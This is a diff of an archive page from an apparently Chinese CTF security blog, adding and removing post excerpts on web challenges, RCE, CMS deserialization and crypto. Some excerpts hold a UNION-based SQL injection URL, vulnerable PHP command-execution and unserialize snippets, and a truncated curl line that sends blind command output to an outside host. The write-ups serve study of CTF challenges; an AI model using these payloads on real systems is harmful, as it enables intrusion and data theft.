@@ -346,6 +346,138 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >
+            
+                <span>XCTF-赛博地球杯工业互联网安全大赛web部分题解</span>
+        </a>
+        <div class="abstract-content">
+            工控云管理系统项目管理页面解析漏洞题目首先给出了源码:http://47.104.156.32:20007/view-source.php关键代码如下：第一层绕过：12345678910111213141516171819&lt;?php     if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') &#123;       include 'config.php';       $id = mysql_real_escape_string...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/01/18</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/01/07/hackme网站边做边记录/" >
+            
+                <span>hackme网站边做边记录</span>
+        </a>
+        <div class="abstract-content">
+            WEBhide and seek查看源代码即可
+guestbook简单注入https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,database(),4 -- 1可以得到数据库名guestbook1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&apos;guestbook&apos; limit ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/01/07</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2017/12/29/Time-Based-RCE/" >
+            
+                <span>Time_Based_RCE</span>
+        </a>
+        <div class="abstract-content">
+            前言想必大家遇到RCE的题目不算少数，那么如果题目可以命令执行，却没有回显，那么我们应该如何有效打击呢？
+盲打RCE先看这样一段函数:123&lt;?php$cmd = $_GET[`cmd`];echo `$cmd`;
+对于这样的情况，我们可以直接?cmd=ls即可拿到回显:1docker-compose.yml flag index.php
+但是如果题目变成123&lt;?php$cmd = $_GET[`cmd`];`$cmd`;
+又该怎么办呢？这里的命令执行结果显然不会打印出来，那么我们如何获取到这个结果？这里介绍一种方法：1curl http://ip.port.b182oj....
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/12/29</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "rce">rce</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2017/12/29/cms小白审计-typecho反序列漏洞/" >
+            
+                <span>cms小白审计-typecho反序列漏洞</span>
+        </a>
+        <div class="abstract-content">
+            前记通过最近的比赛，决定沉淀下来，从复现cms开始慢慢锻炼自己的审计能力，毕竟这个年头的CTF，不会审计只能活在边缘了……
+typecho漏洞审计问题存在于在根目录install.php文件的229-235行1234567&lt;?php$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));Typecho_Cookie::delete('__typecho_config');$db = new Typecho_Db($config['adapter'], $config['prefix'...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/12/29</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "coding">coding</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "cms">cms</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2017/12/25/一道有关密钥编排的DES题目/" >
             
                 <span>一道有关密钥编排的DES题目</span>
@@ -528,135 +660,10 @@ F函数1.将输入的32bit...
         </div>
     </article>
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2017/12/15/parse-url函数小记/" >
-            
-                <span>parse_url函数小记</span>
-        </a>
-        <div class="abstract-content">
-            前记最近遇见parse_url()的次数还挺多的，于是记录一下它的一些小trick
-实战一题目来自2017swpu的一道web题12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);$_POST=Add_S($_POST);$_GET=Add_S($_GET);$_COOKIE=Add_S($_COOKIE);$_REQUEST=Add_S($_REQUEST);function Add_S($array)&#123;    foreach($array as...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/12/15</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >
-            
-                <span>pwnhub成功就是要梭哈之学习记录</span>
-        </a>
-        <div class="abstract-content">
-            前记pwnhub前几天出了个公开赛，赛后学习了下writeup，又有新的收获
-题目代码如下:12345678910111213141516171819202122232425262728&lt;?phphighlight_file('index.txt');$url = "https://sqlchop.chaitin.cn/demo/detect/";$sqlque = 'select 1 from dual where 1=';if(isset($_GET['a']))$payload = str_replace(';','',(string)$_GET['a']);else$pay...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/12/14</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "sql">sql</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2017/12/13/密码学课程3道古典密码题目/" >
-            
-                <span>密码学课程3道古典密码题目</span>
-        </a>
-        <div class="abstract-content">
-            Q1题目给出了程序1234567891011121314import hashlibdef change(key,str):    result = ""    for i in str:        if ord(i)&gt;=97 and ord(i)&lt;=122:            result+=chr(97+(ord(i)+key)%26)        else:            result+=i    return resultkey = *str1 = "********************************"str2 = change(key...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/12/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "crypto">crypto</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2017/12/13/padding-oracle和cbc翻转攻击/" >
-            
-                <span>padding oracle和cbc翻转攻击</span>
-        </a>
-        <div class="abstract-content">
-            知识介绍CBC加密模式：CBC解密模式： 
-Padding Oracle Attack攻击过程这里主要关注一下解密过程密文cipher首先进行一系列处理，如图中的Block Cipher Decryption我们将处理后的值称为middle中间值然后middle与我们输入的iv进行异或操作得到的即为明文但这里有一个规则叫做Padding填充：因为加密是按照16位一组分组进行的而如果不足16位，就需要进行填充比如我们的明文为admin则需要被填充为 admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b一共11个\x0b如果我们输入一个错误的iv...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/12/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "aes">aes</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "crypto">crypto</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/page/10/">&#60; PREV</a><a class="page-number" href="/archives/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/9/">9</a><a class="page-number" href="/archives/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/archives/page/12/">12</a><a class="page-number" href="/archives/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/17/">17</a><a class="extend next" rel="next" href="/archives/page/12/">NEXT &#62;</a>
+        <a class="extend prev" rel="prev" href="/archives/page/10/">&#60; PREV</a><a class="page-number" href="/archives/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/9/">9</a><a class="page-number" href="/archives/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/archives/page/12/">12</a><a class="page-number" href="/archives/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/18/">18</a><a class="extend next" rel="next" href="/archives/page/12/">NEXT &#62;</a>
     </nav>
     
 </main>
@@ -3861,9 +3868,427 @@ Padding Oracle Attack攻击过程这里主要关注一下解密过程密文ciphe
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 170
+        Total : 174
         </div>
         <!-- search  -->
         
@@ -3876,6 +4301,16 @@ Padding Oracle Attack攻击过程这里主要关注一下解密过程密文ciphe
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href= "/2019/03/25/2019-0CTF-Web-WriteUp/" >2019 0CTF Web WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-3-phplimit/" >2018 Code Breaking(3) & phplimit</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -3895,6 +4330,16 @@ Padding Oracle Attack攻击过程这里主要关注一下解密过程密文ciphe
     
         <li class="archive-post-item">
             <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2019/02/24/2019安恒杯-2月月赛Writeup/" >2019安恒杯-2月月赛Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/2019/02/22/2019-Hgame-Week4-Crypto-MixedRSA-Easy/" >2019-Hgame-Week4-Crypto&MixedRSA_Easy</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/21</span><a class="archive-post-title" href= "/2019/02/21/浅谈RSA公钥非素数问题/" >浅谈RSA公钥非素数问题</a>
         </li>
     
     
@@ -4732,12 +5177,12 @@ Padding Oracle Attack攻击过程这里主要关注一下解密过程密文ciphe
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
@@ -4758,13 +5203,13 @@ Padding Oracle Attack攻击过程这里主要关注一下解密过程密文ciphe
     
         <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
     
-        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
-    
-        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
-    
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
     
         <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+    
+        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
+    
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
     
         <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
     
